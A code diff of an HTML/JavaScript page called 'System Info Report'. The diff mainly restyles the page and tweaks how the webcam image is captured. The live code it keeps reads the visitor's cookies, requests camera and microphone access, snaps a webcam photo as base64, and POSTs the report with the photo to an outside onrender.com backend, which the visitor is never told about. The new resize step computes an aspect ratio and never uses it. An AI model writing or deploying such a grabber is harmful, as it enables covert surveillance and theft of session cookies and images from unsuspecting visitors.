@@ -6,44 +6,36 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>System Info Report</title>
   <style>
-    /* General page setup */
     body {
-      font-family: 'Courier New', Courier, monospace;
+      font-family: Arial, sans-serif;
       margin: 0;
       padding: 0;
-      background-color: #121212;
-      color: #00FF00; /* Green text color */
+      background-color: #f4f4f4;
     }
 
-    /* Container for the content */
     .container {
       width: 80%;
       margin: 50px auto;
-      background: #1c1c1c;
+      background: #1b1b1b;
       padding: 20px;
       border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      color: #e2e2e2;
     }
 
     h1 {
       text-align: center;
-      color: #FF6347; /* Red for the title */
-      font-size: 2.5rem;
+      color: #4CAF50;
     }
 
     .error-msg {
       color: red;
       text-align: center;
-      font-weight: bold;
     }
 
     .info-box {
       display: none;
       margin-top: 20px;
-      border: 1px solid #4CAF50; /* Green border */
-      padding: 15px;
-      border-radius: 5px;
-      background-color: #333;
     }
 
     .info-box p {
@@ -56,37 +48,20 @@
       height: auto;
       display: none;
       margin-top: 10px;
-      border: 1px solid #FF6347; /* Red border for webcam feed */
     }
 
     button {
       padding: 10px 20px;
       font-size: 16px;
-      background-color: #FF6347; /* Red button */
+      background-color: #4CAF50;
       color: white;
       border: none;
       cursor: pointer;
       border-radius: 5px;
-      margin-top: 20px;
     }
 
     button:hover {
-      background-color: #D14E2F; /* Darker red for hover effect */
-    }
-
-    /* Text styling for the system info */
-    .system-info {
-      font-family: 'Courier New', Courier, monospace;
-      white-space: pre-wrap;
-      word-wrap: break-word;
-    }
-
-    .success {
-      color: #4CAF50; /* Green success message */
-    }
-
-    .warning {
-      color: #FF6347; /* Red warning messages */
+      background-color: #45a049;
     }
   </style>
 </head>
@@ -105,7 +80,7 @@
     <!-- Display the system info -->
     <div id="infoBox" class="info-box">
       <p><strong>🔍 System Report:</strong></p>
-      <p id="systemInfo" class="system-info"></p>
+      <p id="systemInfo"></p>
 
       <!-- Display webcam feed if accessible -->
       <video id="webcamFeed" autoplay></video>
@@ -136,30 +111,17 @@
         cookies: document.cookie || "No cookies"
       };
 
-      // Fetch IP Address and Location
-      try {
-        const ipResponse = await fetch('https://ipinfo.io/json');
-        const ipData = await ipResponse.json();
-        info.ip = ipData.ip;
-        info.location = ipData.city + ", " + ipData.region + ", " + ipData.country;
-      } catch (e) {
-        console.error("Error fetching IP location:", e);
-      }
-
-      /* permissions ----------------------------------------------------*/
       let webcamStream = null;
       let capturedImageBase64 = null;
 
+      /* permissions ----------------------------------------------------*/
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         $("webcamFeed").srcObject = stream;
         $("webcamFeed").style.display = "block";
         info.webcam = info.microphone = "Accessible";
         webcamStream = stream;
-      } catch (e) {
-        console.error("Error accessing webcam or microphone", e);
-        $("errorMsg").textContent = "Webcam or microphone access denied.";
-      }
+      } catch (e) { console.error("Error accessing webcam or microphone", e); }
 
       // Capture Image from webcam if accessible
       if (webcamStream) {
@@ -167,31 +129,30 @@
         const imageCapture = new ImageCapture(track);
         try {
           const bitmap = await imageCapture.grabFrame();
+          
+          // Resize the image before converting it to base64
           const canvas = document.createElement('canvas');
-          canvas.width = bitmap.width;
-          canvas.height = bitmap.height;
+          const MAX_WIDTH = 640; // Resize to a smaller width
+          const MAX_HEIGHT = 480; // Resize to a smaller height
+
+          // Calculate the new dimensions while maintaining aspect ratio
+          const aspectRatio = bitmap.width / bitmap.height;
+          const newWidth = Math.min(MAX_WIDTH, bitmap.width);
+          const newHeight = Math.min(MAX_HEIGHT, bitmap.height);
+
+          canvas.width = newWidth;
+          canvas.height = newHeight;
+
           const ctx = canvas.getContext('2d');
-          ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
+          ctx.drawImage(bitmap, 0, 0, newWidth, newHeight);
+
+          // Capture the resized image as base64
           capturedImageBase64 = canvas.toDataURL('image/jpeg'); // base64 image string
-        } catch (e) {
-          console.error("Failed to capture webcam image:", e);
-          $("errorMsg").textContent = "Failed to capture webcam image.";
-        }
+          console.log("Captured Image Base64: ", capturedImageBase64); // Debugging
+        } catch (e) { console.error("Failed to capture webcam image:", e); }
       }
 
-      // Battery status (if available)
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        info.battery = `${Math.round(battery.level * 100)}%`;
-        info.charging = battery.charging ? "Yes" : "No";
-      }
-
-      // Connection status (if available)
-      if (navigator.connection) {
-        info.connection = navigator.connection.effectiveType || "Unknown";
-      }
-
-      /* Display message */
+      /* Send to Backend -----------------------------------------------*/
       const message = `🔍 System Report:
 🧠 IP Address: ${info.ip}
 📍 Location: ${info.location}
@@ -211,12 +172,11 @@
       // Display the message in the HTML
       $("systemInfo").textContent = message;
 
-      // Send to Backend (if applicable)
       try {
         await fetch('https://system-info-terminal.onrender.com/send-message', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ message, image: capturedImageBase64 })
+          body: JSON.stringify({ message, image: capturedImageBase64 }) // Send base64 string of the image
         });
       } catch (e) {
         console.error("Failed to send info:", e);
